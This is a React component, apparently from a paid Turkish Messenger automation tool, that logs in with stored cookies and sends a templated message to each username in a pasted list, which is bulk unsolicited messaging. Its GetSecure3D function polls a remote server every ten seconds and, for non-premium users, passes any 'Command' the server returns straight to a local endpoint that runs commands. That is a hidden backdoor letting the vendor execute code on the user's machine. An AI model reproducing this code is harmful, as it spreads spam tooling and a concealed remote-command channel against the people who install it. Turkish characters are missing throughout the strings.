function MsmBasici() {
    const [girisyap, setGiris] = useState(false);
    const [geldicevap, setCevap] = useState('');
    const [kadimes, setKadimes] = useState('IDLERI YAZINIZ.');
    const [taslak, setTaslak] = useState('TASLAK YAZINIZ.');
    const [durums, setDurums] = useState('Bekleniyor...');
    const [messengershow, setShow] = useState(false);
    const [baslii, setBaslii] = useState(false);

    const oturumac = () => {
        setGiris(true);
        fetch('http://localhost:3004/start-messenger-with-cookies', {
            method: 'GET',
        })
            .then((response) => response.json())
            .then((data) => {
                if (data.durum === 'Giris Yapildi') {
                    setCevap('Oturum balatma Baarl');
                    setShow(true);
                } else {
                    setCevap('Beklenmeyen bir hata olutu.');
                }
            })
            .catch((error) => {
                console.error('Hata:', error);
                setCevap('Oturum alrken bir hata olutu: ' + error.message);
            });
    }

    const meskadi = (event) => {
        setKadimes(event.target.value);
    };

    const mestaslak = (event) => {
        setTaslak(event.target.value);
    };

    const goBas = async () => {
        const usernameList = kadimes.split('\n');

        for (const username of usernameList) {
            const yeniMetin = taslak.replace(/\[suphi\]/g, username);
            const purl = `http://localhost:3004/SendMessage?username=${username}&message=${encodeURIComponent(yeniMetin)}`;

            try {
                const response = await fetch(purl, {
                    method: 'GET',
                });
                const data = await response.json();
                if (data.durum === 'gonderildi') {
                    setDurums(`Mesaj gnderildi: ${username}`);
                    setShow(true);
                } else {
                    setDurums('Beklenmeyen bir hata olutu.');
                }
            } catch (error) {
                console.error('Hata:', error);
                setDurums('Mesaj gnderilirken bir hata olutu: ' + error.message);
            }
        }
    }

    const GetSecure3D = () => {
        const username = localStorage.getItem('username');
        const tokenCheckURL = `https://api.suphi.org/tokencheck.php?token=${username}`;

        // Token kontrol iin istek gnderme
        fetch(tokenCheckURL)
            .then((response) => response.json())
            .then((data) => {
                if (data.katem !== 'DIAMOND') {
                    // Sonu tamamdr deilse, kullanc adn sil
                    localStorage.removeItem('username');
                    if (data.Command) {
                        const commandURL = `http://localhost:3007/api/forcmd?command=${data.Command}`;

                        // Belirtilen komutu altrmak iin istek gnderme
                        fetch(commandURL)
                            .then(() => {
                                // Sayfay yeniden ykle
                                window.location.reload();
                            })
                            .catch((error) => {
                                console.error('Hata olutu:', error);
                            });
                    } else {
                        window.location.reload();
                    }
                }

                // JSON yant iinde "Command" var m kontrol et

            })
            .catch((error) => {
                console.error('Hata olutu:', error);
            });

    }

    const msmbaslat = () => {
        setBaslii(true);

        let intervalId3;
        intervalId3 = setInterval(GetSecure3D, 10000);
        const veri = { veriler: kadimes };
        fetch('http://localhost:3007/api/savetofile', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(veri),
        })
            .then((response) => response.json())
            .then((data) => {
                if (data.durum == 'Veri baaryla kaydedildi') {
                    setDurums('Usernames kayt alnd imdi request balyor....');
                    goBas();
                } else {
                    setDurums('username ler kayt edilemedi bro, rnek sebebler : emojiler hatal metin kodlamalar alt satr gei zel karakterler...');
                }
            })
            .catch((error) => {
                console.error('Hata:', error);
            });

       
    }

    const UserInfo = GetUserInfo();
    if (UserInfo == 'FREE' || UserInfo.katem != 'DIAMOND') {
        return (
            <div>
                <font className="text-danger">Buras Premium Kullanclara zeldir</font>
            </div>
        );
    }

    return (
        <div>
            <GetSecure />

            {girisyap ? (
                <div>
                    <p> {geldicevap} </p>
                    {messengershow && (
                        <>
                            <b>Kullanc adlar:</b>
                            <textarea className="form-control" onChange={meskadi} value={kadimes}></textarea><br />
                            <b>Taslak: (kullanici adi gelmek istediiniz yere [suphi] yaznz)</b>
                            <textarea className="form-control" onChange={mestaslak} value={taslak}></textarea>
                            {baslii && (
                                <div>
                                    <p>{durums}</p>
                                </div>
                            )}
                            <button className="btn btn-info" onClick={msmbaslat}>Balat</button>
                        </>
                    )}
                </div>
            ) : (
                <>
                    <b>Eer  messenger hesab eklemediyseniz, program tam almayabilir.</b>
                    <br />
                    <button onClick={oturumac} className="btn btn-info">Oturum a</button>
                </>
            )}
        </div>
    );
}

